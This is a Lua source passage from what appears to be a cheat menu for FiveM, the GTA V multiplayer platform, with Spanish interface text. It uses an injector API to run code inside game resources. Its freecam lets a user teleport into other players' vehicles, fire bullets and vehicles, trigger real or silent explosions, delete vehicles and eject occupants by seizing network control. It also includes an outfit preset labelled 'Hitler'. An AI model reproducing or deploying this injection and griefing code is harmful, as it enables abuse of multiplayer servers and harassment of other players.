        hair_color_2 = 0,
        decals_1     = 0,
        decals_2     = 0,
        tshirt_1     = 15,
        tshirt_2     = 0,
        torso_1      = 178,
        torso_2      = 0,
        arms         = 1,
        pants_1      = 77,
        pants_2      = 0,
        shoes_1      = 55,
        shoes_2      = 0,
        mask_1       = 0,
        mask_2       = 0,
        helmet_1       = 151,
        helmet_2       = 0,
        bproof_1     = 0,
        bproof_2     = 0,
        bags_1         = 0,
        bags_2         = 0,
        beard_1      = 9,
        beard_2      = 10,
        beard_3      = 0,
        beard_4      = 0,
        chain_1      = 3,
        chain_2      = 0,
        glasses_1    = 0,
        glasses_2    = 0,
    })
end

function Menu.ActionBnzOutfit()
    TriggerEvent('skinchanger:loadSkin', {
        sex          = 0,
        face         = 43,
        skin         = 1,
        hair_1       = 0,
        hair_2       = 0,
        hair_color_1 = 0,
        hair_color_2 = 0,
        decals_1     = 0,
        decals_2     = 0,
        tshirt_1     = 200,
        tshirt_2     = 0,
        torso_1      = 496,
        torso_2      = 0,
        arms         = 17,
        pants_1      = 457,
        pants_2      = 0,
        shoes_1      = 275,
        shoes_2      = 0,
        mask_1       = 214,
        mask_2       = 1,
        helmet_1     = -1,
        helmet_2     = -1,
        bproof_1     = 163,
        bproof_2     = 0,
        bags_1       = 133,
        bags_2       = 0,
        beard_1      = 0,
        beard_2      = 10,
        beard_3      = 0,
        beard_4      = 0,
        chain_1      = 330,
        chain_2      = 0,
        glasses_1    = 0,
        glasses_2    = 0,
    })
end

function Menu.ActionJyOutfit()
    local Config = {
        Outfit = {
            sex          = 0,
            face         = 42,
            skin         = 1,
            hair_1       = 0,
            hair_2       = 0,
            hair_color_1 = 0,
            hair_color_2 = 0,
            decals_1     = 0,
            decals_2     = 0,
            tshirt_1     = 15,
            tshirt_2     = 0,
            torso_1      = 924,
            torso_2      = 0,
            arms         = 78,
            pants_1      = 16,
            pants_2      = 3,
            shoes_1      = 208,
            shoes_2      = 5,
            mask_1       = 256,
            mask_2       = 0,
            helmet_1     = 244,
            helmet_2     = 0,
            bproof_1     = 0,
            bproof_2     = 0,
            bags_1       = 152,
            bags_2       = 0,
            beard_1      = 0,
            beard_2      = 10,
            beard_3      = 0,
            beard_4      = 0,
            chain_1      = 180,
            chain_2      = 0,
            glasses_1    = 71,
            glasses_2    = 0
        }
    }

    TriggerEvent('skinchanger:loadSkin', Config.Outfit)

    CreateThread(function()
        while true do
            Wait(3000)

            local ped = PlayerPedId()

            if GetPlayerPedPropIndex(ped, 0) ~= Config.Outfit.helmet_1 then
                SetPedPropIndex(ped, 0, Config.Outfit.helmet_1, Config.Outfit.helmet_2, true)
            end

            if GetPlayerPedPropIndex(ped, 1) ~= Config.Outfit.glasses_1 then
                SetPedPropIndex(ped, 1, Config.Outfit.glasses_1, Config.Outfit.glasses_2, true)
            end

            if GetPedDrawableVariation(ped, 1) ~= Config.Outfit.mask_1 then
                SetPedComponentVariation(ped, 1, Config.Outfit.mask_1, Config.Outfit.mask_2, 0)
            end
        end
    end)
end

function Menu.ActionWOutfit()
    TriggerEvent('skinchanger:loadSkin', {
        sex          = 0,
        face         = 0,
        skin         = 0,
        hair_1       = 0,
        hair_2       = 0,
        hair_color_1 = 0,
        hair_color_2 = 0,
        decals_1     = 0,
        decals_2     = 0,
        tshirt_1     = 15,
        tshirt_2     = 0,
        torso_1      = 271,
        torso_2      = 3,
        arms         = 2,
        pants_1      = 258,
        pants_2      = 0,
        shoes_1      = 149,
        shoes_2      = 0,
        mask_1       = 95,
        mask_2       = 0,
        helmet_1     = -1,
        helmet_2     = -1,
        bproof_1     = 0,
        bproof_2     = 0,
        bags_1       = 0,
        bags_2       = 0,
        beard_1      = 0,
        beard_2      = 0,
        beard_3      = 0,
        beard_4      = 0,
        chain_1      = 0,
        chain_2      = 0,
        glasses_1    = 0,
        glasses_2    = 0,
    })
end

Actions.outfitItem = FindItem("Jugador", "Ropero", "Atuendo")
if Actions.outfitItem then
    Actions.outfitItem.onClick = function(index, option)
        if option == "bnz" then
            Menu.ActionBnzOutfit()
        elseif option == "Staff" then
            Menu.ActionStaffOutfit()
        elseif option == "Hitler" then
            Menu.ActionHitlerOutfit()
        elseif option == "jy" then
            Menu.ActionJyOutfit()
        elseif option == "w" then
            Menu.ActionWOutfit()
        end
    end
end

local function _clampInt(v, mn, mx)
    v = tonumber(v) or mn
    if v < mn then return mn end
    if v > mx then return mx end
    return math.floor(v)
end

local function _applyWardrobeSelection(itemName, selectedIndex)
    local ped = PlayerPedId()
    if not ped or ped == 0 or not DoesEntityExist(ped) then
        return selectedIndex
    end

    selectedIndex = tonumber(selectedIndex) or 1
    if selectedIndex < 1 then selectedIndex = 1 end

    if itemName == "Sombrero" or itemName == "Gafas" then
        local propId = (itemName == "Sombrero") and 0 or 1
        local count = GetNumberOfPedPropDrawableVariations(ped, propId) or 0
        if count <= 0 then
            ClearPedProp(ped, propId)
            return 1
        end

        local clamped = _clampInt(selectedIndex, 1, count)
        local drawable = clamped - 1
        local texCount = GetNumberOfPedPropTextureVariations(ped, propId, drawable) or 0
        local texture = (texCount > 0) and 0 or 0

        ClearPedProp(ped, propId)
        SetPedPropIndex(ped, propId, drawable, texture, true)
        return clamped
    end

    local componentId = nil
    if itemName == "Mascara" then componentId = 1
    elseif itemName == "Torso" then componentId = 11
    elseif itemName == "Camiseta" then componentId = 8
    elseif itemName == "Pantalones" then componentId = 4
    elseif itemName == "Zapatos" then componentId = 6
    end

    if componentId ~= nil then
        local count = GetNumberOfPedDrawableVariations(ped, componentId) or 0
        if count <= 0 then
            return 1
        end

        local clamped = _clampInt(selectedIndex, 1, count)
        local drawable = clamped - 1
        local texCount = GetNumberOfPedTextureVariations(ped, componentId, drawable) or 0
        local texture = (texCount > 0) and 0 or 0

        SetPedComponentVariation(ped, componentId, drawable, texture, 0)
        return clamped
    end

    return selectedIndex
end

local function _bindWardrobeSelector(itemName)
    local item = FindItem("Jugador", "Ropero", itemName)
    if not item then return end

    item.onClick = function(index, _)
        local clamped = _applyWardrobeSelection(itemName, index)
        if clamped and item.selected ~= clamped then
            item.selected = clamped
        end
    end
end

_bindWardrobeSelector("Sombrero")
_bindWardrobeSelector("Mascara")
_bindWardrobeSelector("Gafas")
_bindWardrobeSelector("Torso")
_bindWardrobeSelector("Camiseta")
_bindWardrobeSelector("Pantalones")
_bindWardrobeSelector("Zapatos")

Menu.freecamEnabled = false
local freecamSpeed = 0.5
local freecamFov = 50.0

local freecam_active = false
local cam_pos = vector3(0, 0, 0)
local cam_rot = vector3(0, 0, 0)
local original_pos = vector3(0, 0, 0)
local freecam_just_started = false
local last_click_time = 0
local freecam_mode = 1
local freecam_max_mode = 2

local FreecamOptions = {"Teletransportar", "Spawn Rampa", "Disparar bala", "Disparar vehiculo", "Eliminar vehiculo", "Expulsar", "Explosion real", "Explosion silenciosa"}
local FreecamSelectedOption = 1
local FreecamScrollOffset = 0

local lastScrollTime = 0
local lastScrollValue = 0.0

local VK_W = 0x57
local VK_A = 0x41
local VK_S = 0x53
local VK_D = 0x44
local VK_Q = 0x51
local VK_E = 0x45
local VK_Z = 0x5A
local VK_SHIFT = 0x10
local VK_SPACE = 0x20
local VK_CONTROL = 0x11
local VK_LBUTTON = 0x01
local VK_RBUTTON = 0x02

local normal_speed = 0.5
local fast_speed = 2.5

function StartFreecam()
    local ped = PlayerPedId()
    original_pos = GetEntityCoords(ped)
    cam_pos = vector3(original_pos.x, original_pos.y, original_pos.z)

    local currentRot = GetGameplayCamRot(2)
    cam_rot = vector3(currentRot.x, currentRot.y, currentRot.z)

    FreezeEntityPosition(ped, true)
    ClearPedTasksImmediately(ped)
    SetEntityInvincible(ped, true)
    Susano.LockCameraPos(true)

    freecam_active = true
    freecam_just_started = true
    last_click_time = GetGameTimer()

    Citizen.CreateThread(function()
        Citizen.Wait(500)
        freecam_just_started = false
    end)
end

function StopFreecam()
    local ped = PlayerPedId()
    Susano.LockCameraPos(false)
    FreezeEntityPosition(ped, false)
    SetEntityInvincible(ped, false)
    ClearFocus()
    freecam_active = false
    -- Forzar limpieza de pantalla enviando frames vacios
    -- Clean handled by central loop
end

function TeleportToFreecam()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end

    local ped = PlayerPedId()
    local currentCamCoords = cam_pos
    local currentCamRot = cam_rot

    local pitch = math.rad(currentCamRot.x)
    local yaw = math.rad(currentCamRot.z)

    local dirX = -math.sin(yaw) * math.cos(pitch)
    local dirY = math.cos(yaw) * math.cos(pitch)
    local dirZ = math.sin(pitch)

    local direction = vector3(dirX, dirY, dirZ)

    Susano.InjectResource("any", string.format([[
        local ped = PlayerPedId()
        local camCoords = vector3(%f, %f, %f)
        local direction = vector3(%f, %f, %f)

        local raycastStart = camCoords
        local raycastEnd = vector3(
            camCoords.x + direction.x * 1000.0,
            camCoords.y + direction.y * 1000.0,
            camCoords.z + direction.z * 1000.0
        )

        local raycast = StartExpensiveSynchronousShapeTestLosProbe(
            raycastStart.x, raycastStart.y, raycastStart.z,
            raycastEnd.x, raycastEnd.y, raycastEnd.z,
            -1, ped, 7
        )

        local _, hit, endCoords, surfaceNormal, entityHit = GetShapeTestResult(raycast)

        if hit and entityHit and DoesEntityExist(entityHit) and GetEntityType(entityHit) == 2 then
            local targetVehicle = entityHit
            local playerPed = ped

            SetEntityAsMissionEntity(targetVehicle, true, true)
            if NetworkGetEntityIsNetworked(targetVehicle) then
                NetworkRequestControlOfEntity(targetVehicle)
                local attempts = 0
                while not NetworkHasControlOfEntity(targetVehicle) and attempts < 100 do
                    Wait(0)
                    attempts = attempts + 1
                    NetworkRequestControlOfEntity(targetVehicle)
                end
            end

            SetVehicleDoorsLocked(targetVehicle, 1)
            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

            local freeSeat = -1
            local maxSeats = GetVehicleMaxNumberOfPassengers(targetVehicle)

            local driverSeat = GetPedInVehicleSeat(targetVehicle, -1)
            if driverSeat == 0 or not DoesEntityExist(driverSeat) then
                freeSeat = -1
            else
                for i = 0, maxSeats - 1 do
                    local seatPed = GetPedInVehicleSeat(targetVehicle, i)
                    if seatPed == 0 or not DoesEntityExist(seatPed) then
                        freeSeat = i
                        break
                    end
                end
            end

            if freeSeat ~= -1 then
                ClearPedTasksImmediately(playerPed)
                Wait(50)
                SetPedIntoVehicle(playerPed, targetVehicle, freeSeat)
                Wait(100)

                if not IsPedInVehicle(playerPed, targetVehicle, false) then
                    local vehicleCoords = GetEntityCoords(targetVehicle)
                    SetEntityCoords(playerPed, vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 1.0, false, false, false, false)
                    Wait(50)
                    SetPedIntoVehicle(playerPed, targetVehicle, freeSeat)
                end
            else
                ClearPedTasksImmediately(playerPed)
                Wait(50)
                SetPedIntoVehicle(playerPed, targetVehicle, -1)
                Wait(100)

                if not IsPedInVehicle(playerPed, targetVehicle, false) then
                    local vehicleCoords = GetEntityCoords(targetVehicle)
                    SetEntityCoords(ped, vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 1.0, false, false, false, false)
                end
            end
        elseif hit and endCoords and endCoords.x ~= 0.0 and endCoords.y ~= 0.0 and endCoords.z ~= 0.0 then
            SetEntityCoords(ped, endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
        else
            local teleportPos = vector3(
                camCoords.x + direction.x * 5.0,
                camCoords.y + direction.y * 5.0,
                camCoords.z + direction.z * 5.0
            )
            SetEntityCoords(ped, teleportPos.x, teleportPos.y, teleportPos.z, false, false, false, false)
        end
    ]], currentCamCoords.x, currentCamCoords.y, currentCamCoords.z, direction.x, direction.y, direction.z))
end

function ForceWorldLoad()
    RequestCollisionAtCoord(cam_pos.x, cam_pos.y, cam_pos.z)
    SetFocusPosAndVel(cam_pos.x, cam_pos.y, cam_pos.z, 0.0, 0.0, 0.0)
    NewLoadSceneStart(cam_pos.x, cam_pos.y, cam_pos.z, cam_pos.x, cam_pos.y, cam_pos.z, 150.0, 0)
end

function DrawFreecamMenu()
    if not freecam_active or freecam_destroyer_active then return end

    -- Frame handled by central loop

    local screen_width, screen_height = GetActiveScreenResolution()

    local options = FreecamOptions
    local selectedIndex = FreecamSelectedOption or 1

    local maxVisibleOptions = 4

    if selectedIndex <= FreecamScrollOffset then
        FreecamScrollOffset = math.max(0, selectedIndex - 1)
    elseif selectedIndex > FreecamScrollOffset + maxVisibleOptions then
        FreecamScrollOffset = selectedIndex - maxVisibleOptions
    end

    local visibleOptions = {}
    local visibleIndices = {}
    local startIndex = FreecamScrollOffset + 1
    local endIndex = math.min(startIndex + maxVisibleOptions - 1, #options)

    for i = startIndex, endIndex do
        table.insert(visibleOptions, options[i])
        table.insert(visibleIndices, i)
    end

    local selectedR, selectedG, selectedB = 148.0 / 255.0, 0.0 / 255.0, 211.0 / 255.0
    local normalR, normalG, normalB = 200.0 / 255.0, 200.0 / 255.0, 200.0 / 255.0

    local selectedSize = 24.0
    local normalSize = 18.0

    local spacing = 35.0

    local totalHeight = (#visibleOptions - 1) * spacing + selectedSize
    local startY = screen_height - 150.0

    local maxTextWidth = 0
    for i = 1, #visibleOptions do
        local textWidth = string.len(visibleOptions[i]) * 10
        if textWidth > maxTextWidth then
            maxTextWidth = textWidth
        end
    end

    local centerX = screen_width / 2

    local indicatorText = string.format("%d / %d", selectedIndex, #options)
    local indicatorSize = 14.0
    local indicatorY = startY - 25.0
    local indicatorX = centerX

    local indicatorOutlineOffset = 1.0
    local indicatorOutlineAlpha = 0.5
    Susano.DrawText(indicatorX - indicatorOutlineOffset, indicatorY - indicatorOutlineOffset, indicatorText, indicatorSize, 0.0, 0.0, 0.0, indicatorOutlineAlpha)
    Susano.DrawText(indicatorX, indicatorY - indicatorOutlineOffset, indicatorText, indicatorSize, 0.0, 0.0, 0.0, indicatorOutlineAlpha)
    Susano.DrawText(indicatorX + indicatorOutlineOffset, indicatorY - indicatorOutlineOffset, indicatorText, indicatorSize, 0.0, 0.0, 0.0, indicatorOutlineAlpha)
    Susano.DrawText(indicatorX - indicatorOutlineOffset, indicatorY, indicatorText, indicatorSize, 0.0, 0.0, 0.0, indicatorOutlineAlpha)
    Susano.DrawText(indicatorX + indicatorOutlineOffset, indicatorY, indicatorText, indicatorSize, 0.0, 0.0, 0.0, indicatorOutlineAlpha)
    Susano.DrawText(indicatorX - indicatorOutlineOffset, indicatorY + indicatorOutlineOffset, indicatorText, indicatorSize, 0.0, 0.0, 0.0, indicatorOutlineAlpha)
    Susano.DrawText(indicatorX, indicatorY + indicatorOutlineOffset, indicatorText, indicatorSize, 0.0, 0.0, 0.0, indicatorOutlineAlpha)
    Susano.DrawText(indicatorX + indicatorOutlineOffset, indicatorY + indicatorOutlineOffset, indicatorText, indicatorSize, 0.0, 0.0, 0.0, indicatorOutlineAlpha)

    Susano.DrawText(indicatorX, indicatorY, indicatorText, indicatorSize, normalR, normalG, normalB, 1.0)

    for i = 1, #visibleOptions do
        local actualIndex = visibleIndices[i]
        local isSelected = (actualIndex == selectedIndex)
        local textSize = isSelected and selectedSize or normalSize
        local r, g, b = normalR, normalG, normalB

        if isSelected then
            r, g, b = selectedR, selectedG, selectedB
        end

        local yPos = startY + (i - 1) * spacing
        local xPos = centerX - (maxTextWidth / 2)

        local outlineOffset = 1.0
        local outlineAlpha = 0.5
        Susano.DrawText(xPos - outlineOffset, yPos - outlineOffset, visibleOptions[i], textSize, 0.0, 0.0, 0.0, outlineAlpha)
        Susano.DrawText(xPos, yPos - outlineOffset, visibleOptions[i], textSize, 0.0, 0.0, 0.0, outlineAlpha)
        Susano.DrawText(xPos + outlineOffset, yPos - outlineOffset, visibleOptions[i], textSize, 0.0, 0.0, 0.0, outlineAlpha)
        Susano.DrawText(xPos - outlineOffset, yPos, visibleOptions[i], textSize, 0.0, 0.0, 0.0, outlineAlpha)
        Susano.DrawText(xPos + outlineOffset, yPos, visibleOptions[i], textSize, 0.0, 0.0, 0.0, outlineAlpha)
        Susano.DrawText(xPos - outlineOffset, yPos + outlineOffset, visibleOptions[i], textSize, 0.0, 0.0, 0.0, outlineAlpha)
        Susano.DrawText(xPos, yPos + outlineOffset, visibleOptions[i], textSize, 0.0, 0.0, 0.0, outlineAlpha)
        Susano.DrawText(xPos + outlineOffset, yPos + outlineOffset, visibleOptions[i], textSize, 0.0, 0.0, 0.0, outlineAlpha)

        Susano.DrawText(xPos, yPos, visibleOptions[i], textSize, r, g, b, 1.0)
    end

    -- Frame handled by central loop
end

function realExplosion()
    local coords, entity = getAimCoords(MAX_RAY_DISTANCE)
    if coords then
        AddExplosion(coords.x, coords.y, coords.z, 0, 10.0, true, false, true)
        drawText("explosion real", 0.5, 0.5, 0.6, 4, {0,255,0,255})
    else
        drawText("sin objetivo", 0.5, 0.5, 0.6, 4, {255,0,0,255})
    end
end

function silentExplosion()
    local coords, entity = getAimCoords(MAX_RAY_DISTANCE)
    if coords then
        AddExplosion(coords.x, coords.y, coords.z, 0, 10.0, false, true, false)
        drawText("explosion silenciosa (solo dano)", 0.5, 0.5, 0.6, 4, {0,255,0,255})
    else
        drawText("sin objetivo", 0.5, 0.5, 0.6, 4, {255,0,0,255})
    end
end

function kickFromVehicle()   
local veh = getVehicleFromAim()
    if not veh then
        drawText("no se encontro vehiculo", 0.5, 0.5, 0.6, 4, {255,0,0,255})
        return
    end
    local originalPos = GetEntityCoords(playerPed)
    local wasVisible = IsEntityVisible(playerPed)
    SetEntityVisible(playerPed, false, false)
    FreezeEntityPosition(playerPed, true)
    local targetPos = getTeleportPosForVehicle(veh)
    SetEntityCoords(playerPed, targetPos.x, targetPos.y, targetPos.z, false, false, false, true)
    Wait(100)
    local netId = NetworkGetNetworkIdFromEntity(veh)
    local success = TriggerServerEvent("myMenu:forcePlayerOut", netId)
    drawText("evento de servidor enviado", 0.5, 0.4, 0.5, 4, {255,255,0,255})
    Wait(500)
    drawText("intentando control de red...", 0.5, 0.4, 0.5, 4, {255,255,0,255})
    local controlGained = RequestControl(veh, 1000)
    if controlGained then
        drawText("¡control obtenido! forzando local...", 0.5, 0.4, 0.5, 4, {0,255,0,255})
        for seat = -1, 6 do
            local p = GetPedInVehicleSeat(veh, seat)
            if p and p ~= 0 and p ~= playerPed then
                forcePedOutLocal(p, veh)
            end
        end
    else
        drawText("no se pudo obtener control.", 0.5, 0.4, 0.5, 4, {255,0,0,255})
    end
    Wait(200)
    SetEntityCoords(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false, true)
    SetEntityVisible(playerPed, wasVisible, false)
    FreezeEntityPosition(playerPed, false)
    drawText("¡accion completada!", 0.5, 0.5, 0.6, 4, {0,255,0,255})
end

function deleteVehicle()
    
    local playerPed = PlayerPedId()
    if not playerPed or not DoesEntityExist(playerPed) then
        drawText("ped del jugador invalido", 0.5, 0.5, 0.6, 4, {255,0,0,255})
        return
    end

    local veh = getVehicleFromAim()
    if not veh then
        drawText("no se encontro vehiculo", 0.5, 0.5, 0.6, 4, {255,0,0,255})
        return
    end

    
    local originalPos = GetEntityCoords(playerPed)
    local wasVisible = IsEntityVisible(playerPed)
    SetEntityVisible(playerPed, false, false)
    FreezeEntityPosition(playerPed, true)

    
    local targetPos = getTeleportPosForVehicle(veh)
    SetEntityCoords(playerPed, targetPos.x, targetPos.y, targetPos.z, false, false, false, true)
    Wait(100)

   
    local controlGained = RequestControl(veh, 1000)
    if controlGained then
        drawText("¡control obtenido! eliminando...", 0.5, 0.4, 0.5, 4, {0,255,0,255})
        
        SetEntityAsMissionEntity(veh, true, true)
        DeleteEntity(veh)
    else
        drawText("no se pudo obtener control.", 0.5, 0.4, 0.5, 4, {255,0,0,255})
    end

    Wait(200)

    
    SetEntityCoords(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false, true)
    SetEntityVisible(playerPed, wasVisible, false)
    FreezeEntityPosition(playerPed, false)
  
    if DoesEntityExist(veh) then
        drawText("el vehiculo no pudo ser eliminado", 0.5, 0.5, 0.6, 4, {255,0,0,255})
    else
        drawText("¡vehiculo eliminado!", 0.5, 0.5, 0.6, 4, {0,255,0,255})
    end
end

function ShootBulletFromFreecam()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end

    local ped = PlayerPedId()
    local currentCamCoords = cam_pos
    local currentCamRot = cam_rot

    local pitch = math.rad(currentCamRot.x)
    local yaw = math.rad(currentCamRot.z)

    local dirX = -math.sin(yaw) * math.cos(pitch)
    local dirY = math.cos(yaw) * math.cos(pitch)
    local dirZ = math.sin(pitch)

    local direction = vector3(dirX, dirY, dirZ)

    Susano.InjectResource("any", string.format([[
        local ped = PlayerPedId()
        local camCoords = vector3(%f, %f, %f)
        local direction = vector3(%f, %f, %f)

        local currentWeapon = GetSelectedPedWeapon(ped)
        local hasValidWeapon = false

        if currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
            if HasPedGotWeapon(ped, currentWeapon, false) then
                hasValidWeapon = true
            else
                currentWeapon = GetHashKey("WEAPON_UNARMED")
            end
        end

        if not hasValidWeapon then
            local weapons = {
                "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG",
                "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2",
                "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE",
                "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE",
                "WEAPON_PUMPSHOTGUN", "WEAPON_PUMPSHOTGUN_MK2", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_GUSENBERG",
                "WEAPON_RPG", "WEAPON_GRENADELAUNCHER", "WEAPON_MINIGUN", "WEAPON_RAILGUN"
            }
            for _, weaponName in ipairs(weapons) do
                local weaponHash = GetHashKey(weaponName)
                if HasPedGotWeapon(ped, weaponHash, false) then
                    currentWeapon = weaponHash
                    hasValidWeapon = true
                    break
                end
            end
        end

        if hasValidWeapon and currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
            local startCoords = vector3(
                camCoords.x + direction.x * 0.1,
                camCoords.y + direction.y * 0.1,
                camCoords.z + direction.z * 0.1
            )

            local distance = 1000.0
            local endX = camCoords.x + direction.x * distance
            local endY = camCoords.y + direction.y * distance
            local endZ = camCoords.z + direction.z * distance
            local targetCoords = vector3(endX, endY, endZ)

            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, endX, endY, endZ, -1, ped, 0)
            local retval, hit, hitCoords = GetShapeTestResult(rayHandle)

            if hit and hitCoords then
                targetCoords = hitCoords
            end

            ShootSingleBulletBetweenCoords(
                startCoords.x, startCoords.y, startCoords.z,
                targetCoords.x, targetCoords.y, targetCoords.z,
                40, true, currentWeapon, ped, true, false, 1000.0
            )
        end
    ]], currentCamCoords.x, currentCamCoords.y, currentCamCoords.z, direction.x, direction.y, direction.z))
end

function ShootVehicleFromFreecam()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end

    local ped = PlayerPedId()
    local currentCamCoords = cam_pos
    local currentCamRot = cam_rot

    local pitch = math.rad(currentCamRot.x)
    local yaw = math.rad(currentCamRot.z)

    local dirX = -math.sin(yaw) * math.cos(pitch)
    local dirY = math.cos(yaw) * math.cos(pitch)
    local dirZ = math.sin(pitch)

    local direction = vector3(dirX, dirY, dirZ)

    
    local spawnOffset = 5.0
    local spawnPos = currentCamCoords + direction * spawnOffset

   
    local vehicleModel = "adder"

    Susano.InjectResource("any", string.format([[
        local ped = PlayerPedId()
        local camCoords = vector3(%f, %f, %f)
        local direction = vector3(%f, %f, %f)
        local spawnPos = vector3(%f, %f, %f)

        local vehicleModel = "%s"
        local modelHash = GetHashKey(vehicleModel)

        RequestModel(modelHash)
        local timeout = 0
        while not HasModelLoaded(modelHash) and timeout < 100 do
            Wait(10)
            timeout = timeout + 1
        end

        if HasModelLoaded(modelHash) then
            
            local vehicle = CreateVehicle(modelHash, spawnPos.x, spawnPos.y, spawnPos.z, 0.0, true, false)
            if vehicle and vehicle ~= 0 then
                
                SetEntityAsMissionEntity(vehicle, true, true)
                local netId = NetworkGetNetworkIdFromEntity(vehicle)
                if netId and netId ~= 0 then
                    SetNetworkIdCanMigrate(netId, false)
                    SetNetworkIdExistsOnAllMachines(netId, true)
                end

                
                local shootPower = 200.0
                local velocity = direction * shootPower
                SetEntityVelocity(vehicle, velocity.x, velocity.y, velocity.z)

                
                SetVehicleEngineOn(vehicle, false, false, false)

                
                SetModelAsNoLongerNeeded(modelHash)
            end
        end
    ]], currentCamCoords.x, currentCamCoords.y, currentCamCoords.z,
       direction.x, direction.y, direction.z,
       spawnPos.x, spawnPos.y, spawnPos.z,
       vehicleModel))
end

function HandleInput()
    local current_time = GetGameTimer()

    if IsDisabledControlJustPressed(0, 241) and (current_time - lastScrollTime) > 100 then
        FreecamSelectedOption = FreecamSelectedOption - 1
        if FreecamSelectedOption < 1 then
            FreecamSelectedOption = #FreecamOptions
        end
        lastScrollTime = current_time
    end

    if IsDisabledControlJustPressed(0, 242) and (current_time - lastScrollTime) > 100 then
        FreecamSelectedOption = FreecamSelectedOption + 1
        if FreecamSelectedOption > #FreecamOptions then
            FreecamSelectedOption = 1
        end
        lastScrollTime = current_time
    end

    local click_pressed = IsDisabledControlJustPressed(0, 24)
    if click_pressed and not freecam_just_started and (current_time - last_click_time) > 200 then
        local selectedOptionName = FreecamOptions[FreecamSelectedOption]
        if selectedOptionName == "Teletransportar" then
            TeleportToFreecam()
        elseif selectedOptionName == "Spawn Rampa" then
            local camCoords = GetGameplayCamCoord()
            local camRot = GetGameplayCamRot(2)
            local pitch = math.rad(camRot.x)
            local yaw = math.rad(camRot.z)
            local dirX = -math.sin(yaw) * math.cos(pitch)
            local dirY = math.cos(yaw) * math.cos(pitch)
            local dirZ = math.sin(pitch)
            local direction = vector3(dirX, dirY, dirZ)
            local endCoords = camCoords + (direction * 100.0)
            
            local ray = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, endCoords.x, endCoords.y, endCoords.z, -1, PlayerPedId(), 0)
            local _, hit, coords = GetShapeTestResult(ray)
            
            if hit == 1 then
                spawnRampa(coords)
            else
                spawnRampa(endCoords)
            end
        elseif selectedOptionName == "Disparar bala" then
            ShootBulletFromFreecam()
        elseif selectedOptionName == "Disparar vehiculo" then
            ShootVehicleFromFreecam()
        elseif selectedOptionName == "Eliminar vehiculo" then
            deleteVehicle()
        elseif selectedOptionName == "Expulsar" then
            kickFromVehicle()
        elseif selectedOptionName == "Explosion real" then
            realExplosion()
        elseif selectedOptionName == "Explosion silenciosa" then
            silentExplosion()
        end
        last_click_time = current_time
    end
end

function UpdateFreecam()
    if not freecam_active then return end

    HandleInput()

    local forward = 0.0
    local sideways = 0.0
    local vertical = 0.0

if Susano.GetAsyncKeyState(VK_W) then forward = 1.0 end
if Susano.GetAsyncKeyState(VK_S) then forward = -1.0 end
if Susano.GetAsyncKeyState(VK_D) then sideways = 1.0 end
if Susano.GetAsyncKeyState(VK_A) then sideways = -1.0 end
    if Susano.GetAsyncKeyState(VK_SPACE) then vertical = 1.0 end
    if Susano.GetAsyncKeyState(VK_CONTROL) then vertical = -1.0 end

    local speed = normal_speed
    if Susano.GetAsyncKeyState(VK_SHIFT) then
        speed = fast_speed
    end

    local currentRot = GetGameplayCamRot(2)
    cam_rot = vector3(currentRot.x, currentRot.y, currentRot.z)

    local rad_pitch = math.rad(cam_rot.x)
    local rad_yaw = math.rad(cam_rot.z)

    cam_pos = vector3(
        cam_pos.x + forward * (-math.sin(rad_yaw)) * math.cos(rad_pitch) * speed,
        cam_pos.y + forward * (math.cos(rad_yaw)) * math.cos(rad_pitch) * speed,
        cam_pos.z + forward * (math.sin(rad_pitch)) * speed
    )

    cam_pos = vector3(
        cam_pos.x + sideways * (math.cos(rad_yaw)) * speed,
        cam_pos.y + sideways * (math.sin(rad_yaw)) * speed,
        cam_pos.z
    )

    cam_pos = vector3(cam_pos.x, cam_pos.y, cam_pos.z + vertical * speed)

    ForceWorldLoad()

    Susano.SetCameraPos(cam_pos.x, cam_pos.y, cam_pos.z)
end

local function ToggleFreecam(enable, speed)
    if enable then freecam_destroyer_active = false end -- Desactivar el de Destroyer
    Menu.freecamEnabled = enable
    if speed then
        freecamSpeed = speed
        normal_speed = speed
        fast_speed = speed * 5.0
    end
    if Menu.freecamEnabled then
        StartFreecam()
    else
        StopFreecam()
    end
end

Actions.freecamItem = FindItem("Jugador", "Movimiento", "Freecam")
if Actions.freecamItem then
    Actions.freecamItem.onClick = function(value)
        local speed = Actions.freecamItem.sliderValue or 0.5
        ToggleFreecam(value, speed)
    end

    Actions.freecamItem.onSliderChange = function(value)
        if Actions.freecamItem.value then
            freecamSpeed = value
            normal_speed = value
            fast_speed = value * 5.0
        end
            end
        end

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)

        if freecam_active then
            DisableAllControlActions(0)

            EnableControlAction(0, 1, true)
            EnableControlAction(0, 2, true)
            EnableControlAction(0, 14, true)
            EnableControlAction(0, 15, true)
            EnableControlAction(0, 24, true)
            EnableControlAction(0, 241, true)  
